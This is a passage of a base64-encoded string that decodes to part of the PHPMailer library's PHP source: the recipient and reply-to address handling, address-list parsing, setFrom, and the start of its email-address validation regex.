XBseVRvKCRhZGRyZXNzLCAkbmFtZSA9ICcnKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCdSZXBseS1UbycsICRhZGRyZXNzLCAkbmFtZSk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYW4gYWRkcmVzcyB0byBvbmUgb2YgdGhlIHJlY2lwaWVudCBhcnJheXMgb3IgdG8gdGhlIFJlcGx5VG8gYXJyYXkuIEJlY2F1c2UgUEhQTWFpbGVyCiAgICAgKiBjYW4ndCB2YWxpZGF0ZSBhZGRyZXNzZXMgd2l0aCBhbiBJRE4gd2l0aG91dCBrbm93aW5nIHRoZSBQSFBNYWlsZXI6OiRDaGFyU2V0ICh0aGF0IGNhbiBzdGlsbAogICAgICogYmUgbW9kaWZpZWQgYWZ0ZXIgY2FsbGluZyB0aGlzIGZ1bmN0aW9uKSwgYWRkaXRpb24gb2Ygc3VjaCBhZGRyZXNzZXMgaXMgZGVsYXllZCB1bnRpbCBzZW5kKCkuCiAgICAgKiBBZGRyZXNzZXMgdGhhdCBoYXZlIGJlZW4gYWRkZWQgYWxyZWFkeSByZXR1cm4gZmFsc2UsIGJ1dCBkbyBub3QgdGhyb3cgZXhjZXB0aW9ucy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGtpbmQgT25lIG9mICd0bycsICdjYycsICdiY2MnLCBvciAnUmVwbHlUbycKICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gc2VuZCwgcmVzcC4gdG8gcmVwbHkgdG8KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gdHJ1ZSBvbiBzdWNjZXNzLCBmYWxzZSBpZiBhZGRyZXNzIGFscmVhZHkgdXNlZCBvciBpbnZhbGlkIGluIHNvbWUgd2F5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gYWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCRraW5kLCAkYWRkcmVzcywgJG5hbWUpCiAgICB7CiAgICAgICAgJGFkZHJlc3MgPSB0cmltKCRhZGRyZXNzKTsKICAgICAgICAkbmFtZSA9IHRyaW0ocHJlZ19yZXBsYWNlKCcvW1xyXG5dKy8nLCAnJywgJG5hbWUpKTsgLy9TdHJpcCBicmVha3MgYW5kIHRyaW0KICAgICAgICBpZiAoKCRwb3MgPSBzdHJycG9zKCRhZGRyZXNzLCAnQCcpKSA9PT0gZmFsc2UpIHsKICAgICAgICAgICAgLy8gQXQtc2lnbiBpcyBtaXNzc2luZy4KICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJykgLiAkYWRkcmVzczsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAkcGFyYW1zID0gYXJyYXkoJGtpbmQsICRhZGRyZXNzLCAkbmFtZSk7CiAgICAgICAgLy8gRW5xdWV1ZSBhZGRyZXNzZXMgd2l0aCBJRE4gdW50aWwgd2Uga25vdyB0aGUgUEhQTWFpbGVyOjokQ2hhclNldC4KICAgICAgICBpZiAoJHRoaXMtPmhhczhiaXRDaGFycyhzdWJzdHIoJGFkZHJlc3MsICsrJHBvcykpIGFuZCAkdGhpcy0+aWRuU3VwcG9ydGVkKCkpIHsKICAgICAgICAgICAgaWYgKCRraW5kICE9ICdSZXBseS1UbycpIHsKICAgICAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cygkYWRkcmVzcywgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSkpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlWyRhZGRyZXNzXSA9ICRwYXJhbXM7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoJGFkZHJlc3MsICR0aGlzLT5SZXBseVRvUXVldWUpKSB7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlJlcGx5VG9RdWV1ZVskYWRkcmVzc10gPSAkcGFyYW1zOwogICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgLy8gSW1tZWRpYXRlbHkgYWRkIHN0YW5kYXJkIGFkZHJlc3NlcyB3aXRob3V0IElETi4KICAgICAgICByZXR1cm4gY2FsbF91c2VyX2Z1bmNfYXJyYXkoYXJyYXkoJHRoaXMsICdhZGRBbkFkZHJlc3MnKSwgJHBhcmFtcyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYW4gYWRkcmVzcyB0byBvbmUgb2YgdGhlIHJlY2lwaWVudCBhcnJheXMgb3IgdG8gdGhlIFJlcGx5VG8gYXJyYXkuCiAgICAgKiBBZGRyZXNzZXMgdGhhdCBoYXZlIGJlZW4gYWRkZWQgYWxyZWFkeSByZXR1cm4gZmFsc2UsIGJ1dCBkbyBub3QgdGhyb3cgZXhjZXB0aW9ucy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGtpbmQgT25lIG9mICd0bycsICdjYycsICdiY2MnLCBvciAnUmVwbHlUbycKICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gc2VuZCwgcmVzcC4gdG8gcmVwbHkgdG8KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gdHJ1ZSBvbiBzdWNjZXNzLCBmYWxzZSBpZiBhZGRyZXNzIGFscmVhZHkgdXNlZCBvciBpbnZhbGlkIGluIHNvbWUgd2F5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gYWRkQW5BZGRyZXNzKCRraW5kLCAkYWRkcmVzcywgJG5hbWUgPSAnJykKICAgIHsKICAgICAgICBpZiAoIWluX2FycmF5KCRraW5kLCBhcnJheSgndG8nLCAnY2MnLCAnYmNjJywgJ1JlcGx5LVRvJykpKSB7CiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ0ludmFsaWQgcmVjaXBpZW50IGtpbmQ6ICcpIC4gJGtpbmQ7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgaWYgKCEkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRhZGRyZXNzKSkgewogICAgICAgICAgICAkZXJyb3JfbWVzc2FnZSA9ICR0aGlzLT5sYW5nKCdpbnZhbGlkX2FkZHJlc3MnKSAuICRhZGRyZXNzOwogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIGlmICgka2luZCAhPSAnUmVwbHktVG8nKSB7CiAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cyhzdHJ0b2xvd2VyKCRhZGRyZXNzKSwgJHRoaXMtPmFsbF9yZWNpcGllbnRzKSkgewogICAgICAgICAgICAgICAgYXJyYXlfcHVzaCgkdGhpcy0+JGtpbmQsIGFycmF5KCRhZGRyZXNzLCAkbmFtZSkpOwogICAgICAgICAgICAgICAgJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJGFkZHJlc3MpXSA9IHRydWU7CiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cyhzdHJ0b2xvd2VyKCRhZGRyZXNzKSwgJHRoaXMtPlJlcGx5VG8pKSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+UmVwbHlUb1tzdHJ0b2xvd2VyKCRhZGRyZXNzKV0gPSBhcnJheSgkYWRkcmVzcywgJG5hbWUpOwogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogUGFyc2UgYW5kIHZhbGlkYXRlIGEgc3RyaW5nIGNvbnRhaW5pbmcgb25lIG9yIG1vcmUgUkZDODIyLXN0eWxlIGNvbW1hLXNlcGFyYXRlZCBlbWFpbCBhZGRyZXNzZXMKICAgICAqIG9mIHRoZSBmb3JtICJkaXNwbGF5IG5hbWUgPGFkZHJlc3M+IiBpbnRvIGFuIGFycmF5IG9mIG5hbWUvYWRkcmVzcyBwYWlycy4KICAgICAqIFVzZXMgdGhlIGltYXBfcmZjODIyX3BhcnNlX2Fkcmxpc3QgZnVuY3Rpb24gaWYgdGhlIElNQVAgZXh0ZW5zaW9uIGlzIGF2YWlsYWJsZS4KICAgICAqIE5vdGUgdGhhdCBxdW90ZXMgaW4gdGhlIG5hbWUgcGFydCBhcmUgcmVtb3ZlZC4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJzdHIgVGhlIGFkZHJlc3MgbGlzdCBzdHJpbmcKICAgICAqIEBwYXJhbSBib29sICR1c2VpbWFwIFdoZXRoZXIgdG8gdXNlIHRoZSBJTUFQIGV4dGVuc2lvbiB0byBwYXJzZSB0aGUgbGlzdAogICAgICogQHJldHVybiBhcnJheQogICAgICogQGxpbmsgaHR0cDovL3d3dy5hbmRyZXcuY211LmVkdS91c2VyL2FncmVlbjEvdGVzdGluZy9tcmJzL3dlYi9NYWlsL1JGQzgyMi5waHAgQSBtb3JlIGNhcmVmdWwgaW1wbGVtZW50YXRpb24KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHBhcnNlQWRkcmVzc2VzKCRhZGRyc3RyLCAkdXNlaW1hcCA9IHRydWUpCiAgICB7CiAgICAgICAgJGFkZHJlc3NlcyA9IGFycmF5KCk7CiAgICAgICAgaWYgKCR1c2VpbWFwIGFuZCBmdW5jdGlvbl9leGlzdHMoJ2ltYXBfcmZjODIyX3BhcnNlX2Fkcmxpc3QnKSkgewogICAgICAgICAgICAvL1VzZSB0aGlzIGJ1aWx0LWluIHBhcnNlciBpZiBpdCdzIGF2YWlsYWJsZQogICAgICAgICAgICAkbGlzdCA9IGltYXBfcmZjODIyX3BhcnNlX2Fkcmxpc3QoJGFkZHJzdHIsICcnKTsKICAgICAgICAgICAgZm9yZWFjaCAoJGxpc3QgYXMgJGFkZHJlc3MpIHsKICAgICAgICAgICAgICAgIGlmICgkYWRkcmVzcy0+aG9zdCAhPSAnLlNZTlRBWC1FUlJPUi4nKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MtPm1haWxib3ggLiAnQCcgLiAkYWRkcmVzcy0+aG9zdCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gKHByb3BlcnR5X2V4aXN0cygkYWRkcmVzcywgJ3BlcnNvbmFsJykgPyAkYWRkcmVzcy0+cGVyc29uYWwgOiAnJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYWRkcmVzcycgPT4gJGFkZHJlc3MtPm1haWxib3ggLiAnQCcgLiAkYWRkcmVzcy0+aG9zdAogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIC8vVXNlIHRoaXMgc2ltcGxlciBwYXJzZXIKICAgICAgICAgICAgJGxpc3QgPSBleHBsb2RlKCcsJywgJGFkZHJzdHIpOwogICAgICAgICAgICBmb3JlYWNoICgkbGlzdCBhcyAkYWRkcmVzcykgewogICAgICAgICAgICAgICAgJGFkZHJlc3MgPSB0cmltKCRhZGRyZXNzKTsKICAgICAgICAgICAgICAgIC8vSXMgdGhlcmUgYSBzZXBhcmF0ZSBuYW1lIHBhcnQ/CiAgICAgICAgICAgICAgICBpZiAoc3RycG9zKCRhZGRyZXNzLCAnPCcpID09PSBmYWxzZSkgewogICAgICAgICAgICAgICAgICAgIC8vTm8gc2VwYXJhdGUgbmFtZSwganVzdCB1c2UgdGhlIHdob2xlIHRoaW5nCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRhZGRyZXNzZXNbXSA9IGFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+ICcnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRhZGRyZXNzCiAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBsaXN0KCRuYW1lLCAkZW1haWwpID0gZXhwbG9kZSgnPCcsICRhZGRyZXNzKTsKICAgICAgICAgICAgICAgICAgICAkZW1haWwgPSB0cmltKHN0cl9yZXBsYWNlKCc+JywgJycsICRlbWFpbCkpOwogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRlbWFpbCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gdHJpbShzdHJfcmVwbGFjZShhcnJheSgnIicsICInIiksICcnLCAkbmFtZSkpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRlbWFpbAogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJGFkZHJlc3NlczsKICAgIH0KCiAgICAvKioKICAgICAqIFNldCB0aGUgRnJvbSBhbmQgRnJvbU5hbWUgcHJvcGVydGllcy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MKICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqIEBwYXJhbSBib29sZWFuICRhdXRvIFdoZXRoZXIgdG8gYWxzbyBzZXQgdGhlIFNlbmRlciBhZGRyZXNzLCBkZWZhdWx0cyB0byB0cnVlCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRGcm9tKCRhZGRyZXNzLCAkbmFtZSA9ICcnLCAkYXV0byA9IHRydWUpCiAgICB7CiAgICAgICAgJGFkZHJlc3MgPSB0cmltKCRhZGRyZXNzKTsKICAgICAgICAkbmFtZSA9IHRyaW0ocHJlZ19yZXBsYWNlKCcvW1xyXG5dKy8nLCAnJywgJG5hbWUpKTsgLy9TdHJpcCBicmVha3MgYW5kIHRyaW0KICAgICAgICAvLyBEb24ndCB2YWxpZGF0ZSBub3cgYWRkcmVzc2VzIHdpdGggSUROLiBXaWxsIGJlIGRvbmUgaW4gc2VuZCgpLgogICAgICAgIGlmICgoJHBvcyA9IHN0cnJwb3MoJGFkZHJlc3MsICdAJykpID09PSBmYWxzZSBvcgogICAgICAgICAgICAoISR0aGlzLT5oYXM4Yml0Q2hhcnMoc3Vic3RyKCRhZGRyZXNzLCArKyRwb3MpKSBvciAhJHRoaXMtPmlkblN1cHBvcnRlZCgpKSBhbmQKICAgICAgICAgICAgISR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MpKSB7CiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpIC4gJGFkZHJlc3M7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPkZyb20gPSAkYWRkcmVzczsKICAgICAgICAkdGhpcy0+RnJvbU5hbWUgPSAkbmFtZTsKICAgICAgICBpZiAoJGF1dG8pIHsKICAgICAgICAgICAgaWYgKGVtcHR5KCR0aGlzLT5TZW5kZXIpKSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+U2VuZGVyID0gJGFkZHJlc3M7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXR1cm4gdGhlIE1lc3NhZ2UtSUQgaGVhZGVyIG9mIHRoZSBsYXN0IGVtYWlsLgogICAgICogVGVjaG5pY2FsbHkgdGhpcyBpcyB0aGUgdmFsdWUgZnJvbSB0aGUgbGFzdCB0aW1lIHRoZSBoZWFkZXJzIHdlcmUgY3JlYXRlZCwKICAgICAqIGJ1dCBpdCdzIGFsc28gdGhlIG1lc3NhZ2UgSUQgb2YgdGhlIGxhc3Qgc2VudCBtZXNzYWdlIGV4Y2VwdCBpbgogICAgICogcGF0aG9sb2dpY2FsIGNhc2VzLgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldExhc3RNZXNzYWdlSUQoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+bGFzdE1lc3NhZ2VJRDsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIHRoYXQgYSBzdHJpbmcgbG9va3MgbGlrZSBhbiBlbWFpbCBhZGRyZXNzLgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBjaGVjawogICAgICogQHBhcmFtIHN0cmluZyAkcGF0dGVybnNlbGVjdCBBIHNlbGVjdG9yIGZvciB0aGUgdmFsaWRhdGlvbiBwYXR0ZXJuIHRvIHVzZSA6CiAgICAgKiAqIGBhdXRvYCBQaWNrIGJlc3QgcGF0dGVybiBhdXRvbWF0aWNhbGx5OwogICAgICogKiBgcGNyZThgIFVzZSB0aGUgc3F1aWxvb3BsZS5jb20gcGF0dGVybiwgcmVxdWlyZXMgUENSRSA+IDguMCwgUEhQID49IDUuMy4yLCA1LjIuMTQ7CiAgICAgKiAqIGBwY3JlYCBVc2Ugb2xkIFBDUkUgaW1wbGVtZW50YXRpb247CiAgICAgKiAqIGBwaHBgIFVzZSBQSFAgYnVpbHQtaW4gRklMVEVSX1ZBTElEQVRFX0VNQUlMOwogICAgICogKiBgaHRtbDVgIFVzZSB0aGUgcGF0dGVybiBnaXZlbiBieSB0aGUgSFRNTDUgc3BlYyBmb3IgJ2VtYWlsJyB0eXBlIGZvcm0gaW5wdXQgZWxlbWVudHMuCiAgICAgKiAqIGBub3JlZ2V4YCBEb24ndCB1c2UgYSByZWdleDogc3VwZXIgZmFzdCwgcmVhbGx5IGR1bWIuCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqIEBzdGF0aWMKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gdmFsaWRhdGVBZGRyZXNzKCRhZGRyZXNzLCAkcGF0dGVybnNlbGVjdCA9ICdhdXRvJykKICAgIHsKICAgICAgICAvL1JlamVjdCBsaW5lIGJyZWFrcyBpbiBhZGRyZXNzZXM7IGl0J3MgdmFsaWQgUkZDNTMyMiwgYnV0IG5vdCBSRkM1MzIxCiAgICAgICAgaWYgKHN0cnBvcygkYWRkcmVzcywgIlxuIikgIT09IGZhbHNlIG9yIHN0cnBvcygkYWRkcmVzcywgIlxyIikgIT09IGZhbHNlKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgaWYgKCEkcGF0dGVybnNlbGVjdCBvciAkcGF0dGVybnNlbGVjdCA9PSAnYXV0bycpIHsKICAgICAgICAgICAgLy9DaGVjayB0aGlzIGNvbnN0YW50IGZpcnN0IHNvIGl0IHdvcmtzIHdoZW4gZXh0ZW5zaW9uX2xvYWRlZCgpIGlzIGRpc2FibGVkIGJ5IHNhZmUgbW9kZQogICAgICAgICAgICAvL0NvbnN0YW50IHdhcyBhZGRlZCBpbiBQSFAgNS4yLjQKICAgICAgICAgICAgaWYgKGRlZmluZWQoJ1BDUkVfVkVSU0lPTicpKSB7CiAgICAgICAgICAgICAgICAvL1RoaXMgcGF0dGVybiBjYW4gZ2V0IHN0dWNrIGluIGEgcmVjdXJzaXZlIGxvb3AgaW4gUENSRSA8PSA4LjAuMgogICAgICAgICAgICAgICAgaWYgKHZlcnNpb25fY29tcGFyZShQQ1JFX1ZFUlNJT04sICc4LjAuMycpID49IDApIHsKICAgICAgICAgICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9ICdwY3JlOCc7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gJ3BjcmUnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCdleHRlbnNpb25fbG9hZGVkJykgYW5kIGV4dGVuc2lvbl9sb2FkZWQoJ3BjcmUnKSkgewogICAgICAgICAgICAgICAgLy9GYWxsIGJhY2sgdG8gb2xkZXIgUENSRQogICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAncGNyZSc7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAvL0ZpbHRlcl92YXIgYXBwZWFyZWQgaW4gUEhQIDUuMi4wIGFuZCBkb2VzIG5vdCByZXF1aXJlIHRoZSBQQ1JFIGV4dGVuc2lvbgogICAgICAgICAgICAgICAgaWYgKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzUuMi4wJykgPj0gMCkgewogICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gJ3BocCc7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gJ25vcmVnZXgnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHN3aXRjaCAoJHBhdHRlcm5zZWxlY3QpIHsKICAgICAgICAgICAgY2FzZSAncGNyZTgnOgogICAgICAgICAgICAgICAgLyoqCiAgICAgICAgICAgICAgICAgKiBVc2VzIHRoZSBzYW1lIFJGQzUzMjIgcmVnZXggb24gd2hpY2ggRklMVEVSX1ZBTElEQVRFX0VNQUlMIGlzIGJhc2VkLCBidXQgYWxsb3dzIGRvdGxlc3MgZG9tYWlucy4KICAgICAgICAgICAgICAgICAqIEBsaW5rIGh0dHA6Ly9zcXVpbG9vcGxlLmNvbS8yMDA5LzEyLzIwL2VtYWlsLWFkZHJlc3MtdmFsaWRhdGlvbi8KICAgICAgICAgICAgICAgICAqIEBjb3B5cmlnaHQgMjAwOS0yMDEwIE1pY2hhZWwgUnVzaHRvbgogICAgICAgICAgICAgICAgICogRmVlbCBmcmVlIHRvIHVzZSBhbmQgcmVkaXN0cmlidXRlIHRoaXMgY29kZS4gQnV0IHBsZWFzZSBrZWVwIHRoaXMgY29weXJpZ2h0IG5vdGljZS4KICAgICAgICAgICAgICAgICAqLwogICAgICAgICAgICAgICAgcmV0dXJuIChib29sZWFuKXByZWdfbWF0Y2goCiAgICAgICAgICAgICAgICAgICAgJy9eKD8hKD8+KD8xKSI/KD8+XFxcWyAtfl18W14iXSkiPyg/MSkpezI1NSx9KSg/ISg/Pig/MSkiPyg/PlxcXFsgLX5dfFteIl0pIj8oPzEpKXs2NSx9QCknIC4KICAgICAgICAgICAgICAgICAgICAnKCg/Pig/Pig/PigoPz4oPz4oPz5ceDBEXHgwQSk/W1x0IF0pK3woPz5bXHQgXSpceDBEXHgwQSk/W1x0IF0rKT8pKFwoKD8+KD8yKScgLgogICAgICAgICAgICAgICAgICAgICcoPz5bXHgwMS1ceDA4XHgwQlx4MENceDBFLVwnKi1cW1xdLVx4N0ZdfFxcXFtceDAwLVx4N0ZdfCg/MykpKSooPzIpXCkpKSsoPzIpKXwoPzIpKT8pJyAuCiAgICAgICAgICAgICAgICAgICAgJyhbISMtXCcqK1wvLTk9P14tfi1dK3wiKD8+KD8yKSg/PltceDAxLVx4MDhceDBCXHgwQ1x4MEUtISMtXFtcXS1ceDdGXXxcXFxbXHgwMC1ceDdGXSkpKicgLgogICAgICAgICAgICAgICAgICAgICcoPzIpIikoPz4oPzEpXC4oPzEpKD80KSkqKD8xKUAoPyEoPzEpW2EtejAtOS1dezY0LH0pKD8xKSg/PihbYS16MC05XSg/PlthLXowLTktXSpbYS16MC05XSk/KScgLgogICAgICAgICAgICAgICAgICAgICcoPz4oPzEpXC4oPyEoPzEpW2EtejAtOS1dezY0LH0pKD8xKSg/NSkpezAsMTI2fXxcWyg/Oig/PklQdjY6KD8+KFthLWYwLTldezEsNH0pKD8+Oig/Nikpezd9JyAuCiAgICAgICAgICAgICAgICAgICAgJ3woPyEoPzouKlthLWYwLTldWzpcXV0pezgsfSkoKD82KSg/PjooPzYpKXswLDZ9KT86Oig/Nyk/KSl8KD8+KD8+SVB2NjooPz4oPzYpKD8+Oig/NikpezV9OicgLgogICAgICAgICAgICAgICAgICAgICd8KD8hKD86LipbYS1mMC05XTopezYsfSkoPzgpPzo6KD8+KCg/NikoPz46KD82KSl7MCw0fSk6KT8pKT8oMjVbMC01XXwyWzAtNF1bMC05XXwxWzAtOV17Mn0nIC4KICAgICAgICAgICAgICAgICAgICAnfFsxLTldP1swLTldKSg/PlwuKD85KSl7M30pKVxdKSg/MSkkL2lzRCcsCiAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3MKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgIGNhc2UgJ3BjcmUnOgogICAgICAgICAgICAgICAgLy9BbiBvbGRlciByZWdleCB0aGF0IGRvZXNuJ3QgbmVlZCBhIHJlY2VudCBQQ1JFCiAgICAgICAgICAgICAgICByZXR1cm4gKGJvb2xlYW4pcHJlZ19tYXRjaCgKICAgICAgICAgICAgICAgICAgICAnL14oPyEoPz4iPyg/PlxcXFsgLX5dfFteIl0pIj8pezI1NSx9KSg/ISg/PiI/KD8+XFxcWyAtfl18W14iXSkiPyl7NjUsfUApKD8+JyAuCiAgICAgICAgICAgICAgICAgICAgJ1shIy1cJyorXC8tOT0/Xi1+LV0rfCIoPz4oPz5bXHgwMS1ceDA4XHgwQlx4MENceDBFLSEjLVxbXF0tXHg3Rl18XFxcW1x4MDAtXHhGRl0pKSoiKScgLgogICAgICAgICAgICAgICAgICAgICcoPz5cLig/PlshIy1cJyorXC8tOT0/Xi1+LV0rfCIoPz4oPz5bXHgwMS1ceDA4XHgwQlx4MENceDBFLSEjLVxbXF0tXHg3Rl18XFxcW1x4MDAtXHhGRl0pKSoiKSkqJyAuCiAgICAgICAgICAgICAgICAgICAgJ0AoPz4oPyFbYS16MC05LV17NjQsfSkoPz5bYS16MC05XSg/PlthLXowLTktXSpbYS16MC05XSk/KSg/PlwuKD8hW